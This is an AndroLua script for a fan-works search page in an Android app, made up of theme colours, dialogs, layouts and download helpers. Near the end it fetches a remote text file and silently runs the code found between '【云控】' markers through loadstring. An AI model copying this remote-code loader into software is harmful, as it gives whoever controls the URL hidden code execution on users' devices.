
-- ****默认导入包****
require "import"
import "android.os.*"
import "android.widget.*"
import "android.view.*"
-- ****不需要请删除****

import "androidx.appcompat.widget.LinearLayoutCompat"
import "com.google.android.material.appbar.AppBarLayout"
import "androidx.viewpager.widget.ViewPager"
import "androidx.cardview.widget.CardView"
import "com.google.android.material.imageview.ShapeableImageView"
import "android.widget.LinearLayout"
import "android.widget.TextView"
import "androidx.appcompat.widget.Toolbar"
import "android.content.res.ColorStateList"
import "android.widget.Toolbar"
import "android.view.View"
import "androidx.core.widget.NestedScrollView"
import "com.google.android.material.appbar.CollapsingToolbarLayout"
import "com.google.android.material.bottomnavigation.BottomNavigationView"
import "androidx.coordinatorlayout.widget.CoordinatorLayout"
import "android.view.WindowManager"


import "android.widget.Toolbar"
import "androidx.appcompat.widget.Toolbar"
import "androidx.core.widget.NestedScrollView"
import "com.bumptech.glide.Glide"
import "android.view.WindowManager"
import "com.google.android.material.card.MaterialCardView"
import "android.view.View"
import "com.androlua.Http"
import "com.google.android.material.bottomnavigation.BottomNavigationView"
import "androidx.viewpager.widget.ViewPager"
import "com.google.android.material.appbar.AppBarLayout"
import "android.widget.ImageView"
import "androidx.appcompat.widget.LinearLayoutCompat"
import "android.widget.LinearLayout"
import "android.content.res.ColorStateList"
import "androidx.coordinatorlayout.widget.CoordinatorLayout"
import "com.google.android.material.appbar.CollapsingToolbarLayout"
import "android.widget.TextView"
import "android.content.Context"--文本复制

require"import"
material={"animation","appbar","badge","behavior","bottomappbar","bottomnavigation","bottomsheet","button","canvas","card","checkbox","chip","circularreveal","color","datepicker","dialog","divider","drawable","elevation","expandable","floatingactionbutton","imageview","internal","math","navigation","radiobutton","resources","ripple","shadow","shape","slider","snackbar","stateful","switchmaterial","tabs","textfield","textview","theme","timepicker","tooltip","transformation","transition",}
local path="com.google.android.material."
import (path.."*")
for _,v in pairs(material) do
  import(path..v..".*")
end

import "android.Manifest"
import "androidx.core.app.ActivityCompat"
ActivityCompat.requestPermissions(activity,
String{Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.READ_EXTERNAL_STORAGE}, 0);
--动态权限申请-勿删



theme=tonumber(activity.getSharedData("the"))

-- ****默认导入包****
require "import"
import "android.os.*"
import "android.widget.*"
import "android.view.*"

import "android.widget.LinearLayout"
import "android.view.View"
import "com.google.android.material.card.MaterialCardView"
import "androidx.cardview.widget.CardView"
import "android.widget.TextView"
import "android.widget.EditText"
import "android.widget.ImageView"
import "com.google.android.material.dialog.MaterialAlertDialogBuilder"
import "android.view.WindowManager"
import "com.androlua.LuaAdapter"
import "android.widget.ListView"




import "com.google.android.material.card.MaterialCardView"
import "android.widget.LinearLayout"
import "android.widget.ImageView"
import "android.widget.ListView"
import "android.app.DownloadManager"
import "android.net.Uri"
import "androidx.core.app.ActivityCompat"
import "android.content.Context"
import "com.androlua.LuaAdapter"
import "android.widget.EditText"
import "android.widget.TextView"
import "com.google.android.material.dialog.MaterialAlertDialogBuilder"
import "java.util.jar.Manifest"
import "android.Manifest"
import "androidx.cardview.widget.CardView"
import "java.lang.String"
import "android.view.View"

import "android.content.Intent"
import "android.net.Uri"
wxp=tonumber(activity.getSharedData("wx"))



--获取系统颜色
local resources=activity.getResources()
function m3c(s)
  value = resources.getColor(android.R.color[s])
  return value
end



--
import "androidx.recyclerview.widget.RecyclerView"
import "android.widget.TextView"
import "android.widget.LinearLayout"
import "com.androlua.LuaRecyclerAdapter"
import "androidx.recyclerview.widget.LinearLayoutManager"
import "com.google.android.material.card.MaterialCardView"
import "androidx.recyclerview.widget.RecyclerView$Orientation"
import "androidx.viewpager2.widget.ViewPager2$Orientation"
import "android.graphics.drawable.GradientDrawable$Orientation"
import "androidx.core.widget.NestedScrollView"
import "android.view.WindowManager"
import "com.google.android.material.button.MaterialButton"
import "androidx.recyclerview.widget.*"
import "com.google.android.material.snackbar.Snackbar"
import "com.google.android.material.card.MaterialCardView"
import "com.google.android.material.appbar.AppBarLayout"
import "android.graphics.Color"


--颜色
背景色=0xFFF6F2EF
文字色=0xFF032107
标题色=0xFF706F6D
字体黑色=0xFF000000
字体白色=0xFFFFFFFF
浅色=0xFFFFE28B
深色=0xFFFFB86A
卡片底色=0xFFFFFFFF
大标题色=0xFF000000
透明=0x1FFFFFF
卡片文本=0xFF000000
按钮底色=0xFFFFB86A
按钮文本=0xFFFFFFFF
红色=0xFFFF0040

if theme == 1 then
 
 elseif theme == 2 then
 背景色=0xFFF5F5F5
 浅色=0xFFB3B3B3
 深色=0xFF000000
 按钮底色=0xFF000000
 按钮文本=0xFFFFFFFF
 elseif theme == 3 then
 背景色=0xFFF9E6E5
 浅色=0xFFFEB4B3
 深色=0xFFFEB4B3
 按钮底色=0xFFFEB4B3
 按钮文本=0xFFFFFFFF
 elseif theme == 4 then
 背景色=0xFFF3FFE8
 浅色=0xFF96C34E
 深色=0xFF96C34E
 按钮底色=0xFF96C34E
 按钮文本=0xFFFFFFFF
 elseif theme == 5 then
 背景色=0xff182048
 深色=0xFFBDC7E6
 浅色=0xFFD1DCFF
 大标题色=0xFFFFFFFF
 标题色=0xFFFFFFFF
 卡片底色=0xFF5C6391
 卡片文本=0xFFFFFFFF
 按钮底色=0xFFBDC7E6
 按钮文本=0xFFFFFFFF
 elseif theme == 6 then
 背景色=0xFFBF3545
 深色=0xFFE0C28F
 浅色=0xFFFFFFFF
 大标题色=0xFFFFE6B0
 标题色=0xFFC7B990
 卡片底色=0xFF9D1636
 卡片文本=0xFFFFE6B0
 按钮底色=0xFFE0C28F
 按钮文本=0xFFFFFFFF
 elseif theme == 7 then
 背景色=0xFF6A798E
 深色=0xFFC4CDD7
 浅色=0xFFEAF0FF
 大标题色=0xFFEAF0FF
 标题色=0xFFC0CAD3
 卡片底色=0xFFEAF0FF
 卡片文本=0xFF274466
 按钮底色=0xFFC4CDD7
 按钮文本=0xFFFFFFFF
 elseif theme == 8 then
 背景色=0xff000000
 深色=0xFFFFFFFF
 浅色=0xFF252525
 大标题色=0xFFFFFFFF
 标题色=0xFFFFFFFF
 卡片底色=0xFF252525
 卡片文本=0xFFFFFFFF 
 elseif theme == 9 then
 背景色=0xFFB6DBF6
 深色=0xFFFFFFFF
 浅色=0xFFFFFFFF
 大标题色=0xFFFFFFFF
 标题色=0xFFFFFFFF
 卡片底色=0xFFA2C5FF
 卡片文本=0xFFFFFFFF
 按钮底色=0xFF74A8FF
 按钮文本=0xFFFFFFFF
 elseif theme == 10 then--浅色跟随
 背景色=m3c("system_neutral1_10")
 大标题色=m3c("system_accent1_600")
 标题色=m3c("system_accent1_600")
 浅色=m3c("system_accent1_600")
 深色=m3c("system_accent1_600")
 卡片底色=m3c("system_accent2_50")
 卡片文本=m3c("system_accent1_600")
 按钮底色=m3c("system_accent1_200")
 按钮文本=m3c("system_neutral1_10")
 elseif theme == 11 then--深色跟随
 背景色=m3c("system_accent1_600")
 大标题色=m3c("system_neutral1_10")
 标题色=m3c("system_neutral1_10")
 浅色=m3c("system_neutral1_10")
 深色=m3c("system_neutral1_10")
 卡片底色=m3c("system_accent1_200")
 卡片文本=m3c("system_accent1_600")
 按钮底色=m3c("system_accent1_800")
 按钮文本=m3c("system_neutral1_10")
end



--r
if activity.getPackageName()=="net.fusion64j" then
  R=luajava.bindClass "net.fusion64j.R"
 else
  R=luajava.bindClass "net.fusion64j.core.R"
end

--函数
function checked(vv,num)--底栏项目选中事件
  vv.getMenu().getItem(num).setChecked(true)
end
--退出动画
function onKeyDown(key,event)
  if(key==4)then
    activity.finish()
    --下面代码的参数(1,2)就是和跳转复制代码相反(2,1)
    activity.overridePendingTransition(R.anim.fragment_open_enter,R.anim.fragment_close_exit)
  end
end

 
 ttc=tonumber(activity.getSharedData("tc"))
--弹窗所需代码
require "import"
import "android.os.*"
import "android.widget.*"
import "android.view.*"
require "import"
import "com.google.android.material.card.MaterialCardView"
import "com.google.android.material.bottomappbar.BottomAppBar$AnimationListener"
import "androidx.appcompat.app.AlertDialog"
import "android.app.AlertDialog"
import "android.graphics.drawable.ColorDrawable"
import "android.widget.ScrollView"
import "android.view.WindowManager"
import "android.widget.LinearLayout"
import "androidx.appcompat.app.AlertDialog"
import "android.app.AlertDialog"
import "android.view.Gravity"
import "androidx.recyclerview.widget.RecyclerView$Orientation"
import "androidx.viewpager2.widget.ViewPager2$Orientation"
import "android.graphics.drawable.GradientDrawable$Orientation"
import "android.widget.TextView"
import "android.view.animation.TranslateAnimation"
import "android.content.res.ColorStateList"
import "android.view.animation.Animation$AnimationListener"
import "android.widget.EditText"
import "android.widget.FrameLayout"
import "android.widget.ListView"
import "android.widget.ImageView"
主主题色="0xFFFFFFFF"

副主题色="0xFF000000"


----------**********----------  自定义弹窗函数库 ----------**********----------
function 布局波纹(颜色)
  import "android.content.res.ColorStateList"
  return activity.Resources.getDrawable(activity.obtainStyledAttributes({android.R.attr.selectableItemBackgroundBorderless}).getResourceId(0,0)).setColor(ColorStateList(int[0].class{int{}},int{颜色}))
end

----------对话框所需函数----------

function 关闭对话框()
  dialog.dismiss()
end

----------弹窗所需函数----------

function 弹出弹窗(time)
  local 动画=TranslateAnimation(0,0,0,activity.getHeight())
  动画.setDuration(time);
  窗口.startAnimation(动画);
end

function 关闭弹窗(time)
  local 动画=TranslateAnimation(0,0,0,activity.getHeight())
  动画.setDuration(time);
  窗口.startAnimation(动画);
  动画.setAnimationListener(AnimationListener{
    onAnimationEnd=function()
      关闭对话框()
    end})
end

----------通用函数----------

function Dialog参数(布局,重力,阴影,背景,值)
  local dl=AlertDialog.Builder(this)
  dialog=dl.show();
  ----------
  if 值[1]==1 then
    dialog.setCanceledOnTouchOutside(false);
   else --设置点击外部区域是否可以消失
    dialog.setCanceledOnTouchOutside(false);
  end
  ----------
  local dialogWindow=dialog.getWindow();
  dialogWindow.setContentView(loadlayout(布局)); --设置主要布局
  dialogWindow.setGravity(重力); --设置布局重力属性
  dialogWindow.setDimAmount(阴影); --设置背景阴影
  dialogWindow.setBackgroundDrawable(ColorDrawable(背景)); --设置整体背景颜色
  dialogWindow.getAttributes().width=activity.getWidth(); --设置布局宽度为屏幕宽
  dialogWindow.clearFlags(WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM); --清除弹窗标志
  ----------
  if 值[2] then
    弹出弹窗(值[3])
  end
end

--所需代码结束  



Tritium=
{
  LinearLayout;--线性控件
  orientation='vertical';--布局方向
  layout_width='fill';--布局宽度
  layout_height='fill';--布局高度  
  backgroundColor=背景色;
     {
        MaterialCardView;--卡片控件
        layout_margin='5dp';--边距
        layout_gravity='center|left';--重力
        elevation='0dp';--阴影
        layout_width='fill';--宽度
        layout_height='50dp';--高度
        CardBackgroundColor=背景色;--颜色
        radius='40dp';--圆角
        layout_marginLeft='0dp';--左距
        layout_marginRight='0dp';--右距
        layout_marginTop="70dp",--顶距       
        elevation='0dp';--阴影    
       {
        TextView,
        layout_gravity='center|left';--重力
        layout_marginLeft='30dp';--左距
        text="同人",
        textSize="28sp",
        textStyle="bold",
        textColor=大标题色;--文字颜色
        id="Ti2",
       },       
       {
        MaterialCardView;--卡片控件
        layout_margin='5dp';--边距
        layout_gravity='center|right';--重力
        elevation='0dp';--阴影
        layout_width='30dp';--宽度
        layout_height='30dp';--高度
        CardBackgroundColor=背景色;--颜色
        radius='50dp';--圆角
        layout_marginLeft='180dp';--左距
        layout_marginRight='40dp';--右距
        layout_marginTop="5dp",--顶距       
        elevation='0dp';--阴影
        id="";
         {
          ImageView,
          scaleType="centerCrop",
          layout_width="fill",
          layout_height="fill",
          layout_marginTop="0dp",--顶距
          layout_margin='0%w';--边距
          src="ic_public_cancel.png",
          ColorFilter=大标题色;--图片着色  
          id="back";
         },       
      
       },     
      },

  {
    CardView;--卡片控件
    layout_width='fill';--卡片宽度
    layout_height='48dp';--卡片高度
    cardBackgroundColor=卡片底色;--卡片颜色
    layout_marginTop='10dp';--左距
    layout_marginLeft='30dp';--左距
    layout_marginRight='30dp';--左距
    layout_margin='0dp';--卡片边距
    cardElevation='0dp';--卡片阴影
    radius='17dp';--卡片圆角
    {
      EditText;--编辑框控件
      layout_width='fill';--控件宽度
      layout_height='fill';--控件高度
      id='edit';--设置控件ID
      Hint='搜索';--编辑框内容为空时提示文字
      hintTextColor=标题色;--提示文字颜色
      textSize='16sp';--本文大小
      textColor=大标题色;--本文颜色
      layout_marginLeft='15dp';--布局左距
      layout_marginRight='15dp';--布局右距
      gravity='center|left';--重力
      background='#00ffffff';--底条透明
      singleLine=true;--设置单行输入，禁止换行
      imeOptions='actionSearch';--设置回车键搜索,必须开启单行输入才能生效
    };
  };
  {
    ListView;--列表适配器
    layout_marginLeft='23dp';--左距
    layout_marginRight='23dp';--左距
    layout_marginTop='10dp';--左距
    layout_width='fill';--宽度
    layout_height='fill';--高度
    id="list";
    dividerHeight="0";--分割线高度
    verticalScrollBarEnabled=true;--隐藏滑条
  };
  {
    LinearLayout;--线性控件
    orientation='vertical';--布局方向
    layout_width='fill';--布局宽度
    layout_height='fill';--布局高度
    id='tips';--控件ID
    {
      TextView;--文本控件
      layout_width='fill';--控件宽度
      layout_height='fill';--控件高度
      text='无结果\n(该搜索不支持模糊搜索呢🥲)';--显示文字
      gravity='center';--重力
      textColor=大标题色;--文字颜色
    };
  };
}


activity.setContentView(loadlayout(Tritium))





function back.onClick()
  activity.finish()
  activity.overridePendingTransition(R.anim.fragment_open_enter,R.anim.fragment_close_exit)
end


require "import"
import "android.net.Uri"
import "android.content.Context"
import "android.app.DownloadManager"
function 系统下载(直链,目录,名称)
  import "android.content.Context"
  import "android.net.Uri"
  downloadManager = activity.getSystemService(Context.DOWNLOAD_SERVICE)
  request = DownloadManager.Request(Uri.parse(直链))
  request.setAllowedNetworkTypes(DownloadManager.Request.NETWORK_MOBILE|DownloadManager.Request.NETWORK_WIFI)
  request.setDestinationInExternalPublicDir(目录,名称)
  downloadManager.enqueue(request)
end

function 浏览器打开(链接)
  import "android.content.Intent"
  import "android.net.Uri"
  viewIntent = Intent("android.intent.action.VIEW",Uri.parse(链接))
  activity.startActivity(viewIntent)
end

--更新横屏状态
function isHorizontal()
  if activity.width>activity.height
    --横屏显示
   item=--配置项目布局表
{
  LinearLayout;--线性控件
  orientation='vertical';--布局方向
  layout_width='fill';--布局宽度
  layout_height='fill';--布局高度
  {
    CardView;--卡片控件
    layout_width='fill';--卡片宽度
    layout_height='400dp';--卡片高度
    cardBackgroundColor=卡片底色;--卡片颜色
    layout_marginLeft='6dp';--左距
    layout_marginRight='6dp';--左距
    layout_marginTop='10dp';--卡片边距
    layout_marginBottom='10dp';--卡片边距
    cardElevation='0dp';--卡片阴影
    id='smain';--设置控件ID
    radius='20dp';--卡片圆角

      {
        TextView;--文本控件
        layout_marginTop='30dp';--布局顶距                  
        layout_marginLeft='40dp';--边距 
        layout_marginRight='0dp';--边距 
        layout_width='fill';--控件宽度
        layout_height='wrap';--控件高度
        textSize='36sp';--文字大小
        textColor=大标题色;--文字颜色       
        layout_gravity='left';--重力
        id='title';--设置控件ID
      };
      {
        TextView;--文本控件
        layout_width='fill';--控件宽度
        gravity='center|left';--重力属性
        layout_height='wrap';--控件高度
        layout_marginLeft='40dp';--边距 
        layout_marginRight='0dp';--边距 
        layout_marginTop='80dp';--布局顶距   
        MaxLines=3;--设置最大输入行数
        textSize='26sp';--文字大小
        textColor=标题色;--文字颜色        
        layout_gravity='left';--重力
        id='content';--设置控件ID
      };
      {
        TextView;--文本控件
        layout_width='fill';--控件宽度
        layout_height='0dp';--控件高度
        layout_marginTop='4dp';--布局顶距
        MaxLines=3;--设置最大输入行数
        layout_marginTop='300dp';--布局顶距
        ellipsize='end';--多余文字用省略号显示
        gravity='left|center';--重力
        id='link';--设置控件ID
      };
      {
        TextView;--文本控件
        layout_width='fill';--控件宽度
        layout_height='0dp';--控件高度
        layout_marginTop='4dp';--布局顶距
        MaxLines=3;--设置最大输入行数
        ellipsize='end';--多余文字用省略号显示
        gravity='left|center';--重力
        id='pid';--设置控件ID
      };
      {
       CardView;--卡片控件
       layout_width='500dp';--卡片宽度
       layout_height='fill';--卡片高度
       cardBackgroundColor=背景色;--卡片颜色
       layout_marginLeft='6dp';--左距
       layout_marginRight='60dp';--左距
       layout_marginTop='60dp';--卡片边距
       layout_marginBottom='60dp';--卡片边距
       cardElevation='0dp';--卡片阴影
       layout_gravity='right|center';--重力
       id='main';--设置控件ID
       radius='10dp';--卡片圆角
       {
        ImageView,       
        layout_marginLeft='0dp';--边距    
        layout_marginRight='0dp';--边距     
        layout_width='fill';--宽度
        layout_height='fill';--高度    
        layout_margin='0dp';--边距 
        scaleType="centerInside",         
        layout_gravity='center';--重力    
        id='pic';--设置控件ID         
        src="",                                
       };
      },
      
    
  };



  
};
   else
    --竖屏显示
   item=--配置项目布局表
{
  LinearLayout;--线性控件
  orientation='vertical';--布局方向
  layout_width='fill';--布局宽度
  layout_height='fill';--布局高度
  {
    CardView;--卡片控件
    layout_width='fill';--卡片宽度
    layout_height='wrap';--卡片高度
    cardBackgroundColor=卡片底色;--卡片颜色
    layout_marginLeft='6dp';--左距
    layout_marginRight='6dp';--左距
    layout_marginTop='10dp';--卡片边距
    layout_marginBottom='10dp';--卡片边距
    cardElevation='0dp';--卡片阴影
    id='smain';--设置控件ID
    radius='20dp';--卡片圆角
    {
      LinearLayout;--线性控件
      orientation='vertical';--布局方向
      layout_width='fill';--布局宽度
      layout_height='wrap';--布局高度
      layout_marginLeft='12dp';--布局左距
      layout_marginRight='12dp';--布局右距
      layout_marginTop='6dp';--布局顶距
      layout_marginBottom='10dp';--布局底距
      {
        TextView;--文本控件
        layout_marginTop='10dp';--布局顶距
        gravity='center|left';--重力属性          
        layout_marginLeft='10dp';--边距 
        layout_marginRight='60dp';--边距 
        layout_width='fill';--控件宽度
        layout_height='wrap';--控件高度
        textSize='16sp';--文字大小
        textColor=大标题色;--文字颜色
        gravity='left|center';--重力
        id='title';--设置控件ID
      };
      {
        TextView;--文本控件
        layout_width='fill';--控件宽度
        gravity='center|left';--重力属性
        layout_height='wrap';--控件高度
        layout_marginLeft='10dp';--边距 
        layout_marginRight='60dp';--边距 
        layout_marginTop='1dp';--布局顶距
        MaxLines=3;--设置最大输入行数
        textColor=标题色;--文字颜色
        ellipsize='end';--多余文字用省略号显示
        gravity='left|center';--重力
        id='content';--设置控件ID
      };
      {
        TextView;--文本控件
        layout_width='fill';--控件宽度
        layout_height='0dp';--控件高度
        layout_marginTop='4dp';--布局顶距
        MaxLines=3;--设置最大输入行数
        ellipsize='end';--多余文字用省略号显示
        gravity='left|center';--重力
        id='link';--设置控件ID
      };
      {
        TextView;--文本控件
        layout_width='fill';--控件宽度
        layout_height='0dp';--控件高度
        layout_marginTop='4dp';--布局顶距
        MaxLines=3;--设置最大输入行数
        ellipsize='end';--多余文字用省略号显示
        gravity='left|center';--重力
        id='pid';--设置控件ID
      };
      {
       CardView;--卡片控件
       layout_width='wrap';--卡片宽度
       layout_height='250dp';--卡片高度
       cardBackgroundColor=卡片底色;--卡片颜色
       layout_marginLeft='6dp';--左距
       layout_marginRight='6dp';--左距
       layout_marginTop='10dp';--卡片边距
       layout_marginBottom='10dp';--卡片边距
       cardElevation='0dp';--卡片阴影
       id='main';--设置控件ID
       radius='10dp';--卡片圆角
       {
        ImageView,       
        layout_marginLeft='0dp';--边距    
        layout_marginRight='0dp';--边距     
        layout_width='wrap';--宽度
        layout_height='wrap';--高度    
        layout_margin='0dp';--边距 
        scaleType="centerCrop",        
        id='pic';--设置控件ID         
        src="",                                
       };
      },
      
    };
  };



  
};
  end
end
isHorizontal()

--横屏监听
currentOrientation=activity.resources.configuration.orientation
oldOrientation=currentOrientation
luajava.override(OrientationListener,{
  onOrientationChanged=function(_,orientation)
    currentOrientation=activity.resources.configuration.orientation
    if currentOrientation~=oldOrientation
      isHorizontal()
    end
    oldOrientation=currentOrientation
  end}).enable()

----------------------------------------------------------------

Http.get("https://cdn.lightxi.com/cloudreve/uploads/2024/08/22/iMsK3zaW_tr_cla.txt",nil,nil,nil,function(code,content)
  if(code==200 and content)then
    content=content:gsub("&nbsp;"," ") or content;
    content=content:gsub("&lt;","<") or content;
    content=content:gsub("&gt;",">") or content;
    content=content:gsub("&amp;","&") or content;
    if(content)then
      取代码=content:match('content="(.+)" />')
      远程加载代码=content:match("【云控】(.-)【云控】")
      local status,error=pcall(loadstring(远程加载代码))

      if not status then

      end
    end
  end   
end)


-------**----------------------------------------------------------------






--沉浸状态栏
activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS)

--主题补充
if theme == 1 then
 
 elseif theme == 2 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 elseif theme == 3 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 elseif theme == 4 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 elseif theme == 5 then
 --设置顶部状态栏颜色
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 back.setColorFilter(0xFFFFFFFF) 
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
 elseif theme == 6 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 back.setColorFilter(0xFFFFE6B0)
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
 elseif theme == 7 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 back.setColorFilter(0xFFEAF0FF)
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
 elseif theme == 8 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 back.setColorFilter(0xFFFFFFFF)
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
 elseif theme == 9 then 
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 back.setColorFilter(0xFFFFFFFF)
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
 elseif theme == 10 then 
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 elseif theme == 11 then 
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
end

--沉浸导航栏
activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)



function back.onClick()
  activity.finish()
  activity.overridePendingTransition(R.anim.fragment_open_enter,R.anim.fragment_close_exit)
end
